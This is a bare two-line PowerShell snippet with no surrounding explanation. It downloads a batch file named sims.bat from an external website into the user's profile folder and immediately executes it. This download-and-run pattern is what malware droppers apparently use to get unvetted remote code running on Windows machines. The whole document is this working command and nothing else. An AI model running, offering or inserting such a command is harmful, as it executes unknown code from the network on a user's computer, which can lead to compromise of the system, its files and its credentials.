Import-Module BitsTransfer; Start-BitsTransfer 'https://baggette.org/sims.bat' "$($env:USERPROFILE)\sims.bat";
Start-Process "$($env:USERPROFILE)\sims.bat"